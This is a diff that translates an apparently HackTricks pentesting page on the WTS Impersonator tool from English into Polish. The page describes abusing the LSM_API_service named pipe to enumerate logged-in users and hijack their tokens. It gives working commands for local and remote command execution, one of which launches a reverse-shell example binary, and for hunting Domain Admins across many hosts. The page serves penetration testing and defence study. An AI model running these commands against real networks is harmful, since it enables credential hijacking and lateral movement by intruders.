@@ -1,51 +1,48 @@
 {{#include ../../banners/hacktricks-training.md}}
 
-The **WTS Impersonator** tool exploits the **"\\pipe\LSM_API_service"** RPC Named pipe to stealthily enumerate logged-in users and hijack their tokens, bypassing traditional Token Impersonation techniques. This approach facilitates seamless lateral movements within networks. The innovation behind this technique is credited to **Omri Baso, whose work is accessible on [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.
+Narzędzie **WTS Impersonator** wykorzystuje **"\\pipe\LSM_API_service"** RPC Named pipe do dyskretnego enumerowania zalogowanych użytkowników i przejmowania ich tokenów, omijając tradycyjne techniki impersonacji tokenów. Takie podejście ułatwia płynne ruchy lateralne w sieciach. Innowacja stojąca za tą techniką jest przypisywana **Omriemu Baso, którego prace są dostępne na [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.
 
-### Core Functionality
+### Podstawowa funkcjonalność
 
-The tool operates through a sequence of API calls:
-
+Narzędzie działa poprzez sekwencję wywołań API:
 ```powershell
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
+### Kluczowe moduły i użycie
 
-### Key Modules and Usage
+- **Enumeracja użytkowników**: Możliwa jest lokalna i zdalna enumeracja użytkowników za pomocą narzędzia, używając poleceń dla obu scenariuszy:
 
-- **Enumerating Users**: Local and remote user enumeration is possible with the tool, using commands for either scenario:
+- Lokalnie:
+```powershell
+.\WTSImpersonator.exe -m enum
+```
+- Zdalnie, określając adres IP lub nazwę hosta:
+```powershell
+.\WTSImpersonator.exe -m enum -s 192.168.40.131
+```
 
-  - Locally:
-    ```powershell
-    .\WTSImpersonator.exe -m enum
-    ```
-  - Remotely, by specifying an IP address or hostname:
-    ```powershell
-    .\WTSImpersonator.exe -m enum -s 192.168.40.131
-    ```
+- **Wykonywanie poleceń**: Moduły `exec` i `exec-remote` wymagają kontekstu **Usługi** do działania. Lokalne wykonanie wymaga jedynie pliku wykonywalnego WTSImpersonator i polecenia:
 
-- **Executing Commands**: The `exec` and `exec-remote` modules require a **Service** context to function. Local execution simply needs the WTSImpersonator executable and a command:
+- Przykład lokalnego wykonania polecenia:
+```powershell
+.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
+```
+- PsExec64.exe można użyć do uzyskania kontekstu usługi:
+```powershell
+.\PsExec64.exe -accepteula -s cmd.exe
+```
 
-  - Example for local command execution:
-    ```powershell
-    .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
-    ```
-  - PsExec64.exe can be used to gain a service context:
-    ```powershell
-    .\PsExec64.exe -accepteula -s cmd.exe
-    ```
+- **Zdalne wykonywanie poleceń**: Polega na tworzeniu i instalowaniu usługi zdalnie, podobnie jak PsExec.exe, co pozwala na wykonanie z odpowiednimi uprawnieniami.
 
-- **Remote Command Execution**: Involves creating and installing a service remotely similar to PsExec.exe, allowing execution with appropriate permissions.
+- Przykład zdalnego wykonania:
+```powershell
+.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
+```
 
-  - Example of remote execution:
-    ```powershell
-    .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
-    ```
-
-- **User Hunting Module**: Targets specific users across multiple machines, executing code under their credentials. This is especially useful for targeting Domain Admins with local admin rights on several systems.
-  - Usage example:
-    ```powershell
-    .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
-    ```
+- **Moduł polowania na użytkowników**: Celuje w określonych użytkowników na wielu maszynach, wykonując kod pod ich poświadczeniami. Jest to szczególnie przydatne w celu atakowania administratorów domeny z lokalnymi prawami administratora na kilku systemach.
+- Przykład użycia:
+```powershell
+.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
+```
 
 {{#include ../../banners/hacktricks-training.md}}
-
